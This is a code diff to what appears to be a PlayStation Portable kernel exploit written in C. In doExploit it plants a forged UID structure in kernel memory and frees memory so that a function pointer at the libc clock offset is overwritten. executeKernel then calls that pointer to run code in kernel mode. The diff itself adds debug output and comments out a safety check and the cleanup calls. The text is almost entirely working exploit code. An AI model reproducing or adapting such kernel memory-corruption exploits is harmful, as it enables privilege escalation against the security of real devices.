@@ -98,7 +98,7 @@ void repairInstruction(KernelFunctions* k_tbl) {
 
 int stubScanner(UserFunctions* tbl){
     g_tbl = tbl;
-    
+    tbl->freeMem(tbl);
     if (g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON) < 0)
         return -1;
 
@@ -149,29 +149,30 @@ int doExploit(void) {
 
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
-    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)(&string[0]), PSP_SMEM_Low, 0x10, NULL);
-
-    int found = checkPlantUID(uid);
-    if (!found) return -1;
-
-    if (newaddr != dummyaddr-FAKE_UID_OFFSET){
-      encrypted_uid = uid ^ seed;
-      string[3] = encrypted_uid;
-      g_tbl->KernelFreePartitionMemory(plantid);
-      g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)(&string[0]), PSP_SMEM_Low, 0x10, NULL);
-    }
+    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_Low, 0x10, NULL);
 
     g_tbl->KernelDcacheWritebackAll();
+
+    u32 plantaddr = 0x88000000 + ((plantid >> 5) & ~3);
+    PRTSTR3("DATA: (%p, %p) diff: %d", plantaddr, dummyaddr, plantaddr-dummyaddr);
+
+    /*
+    if (!checkPlantUID(uid)){
+      PRTSTR("PANIC!");
+    }
+    */
 
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
 
+    /*
     g_tbl->KernelFreePartitionMemory(plantid);
     g_tbl->KernelFreePartitionMemory(dummyid);
 
     g_tbl->UtilityUnloadModule(PSP_MODULE_NET_INET);
     g_tbl->UtilityUnloadModule(PSP_MODULE_NET_COMMON);
     g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);
+    */
 
     if (res < 0)
         return res;
@@ -188,4 +189,3 @@ void executeKernel(u32 kernelContentFunction){
   // Execute kernel function
   g_tbl->KernelLibcClock();
 }
-
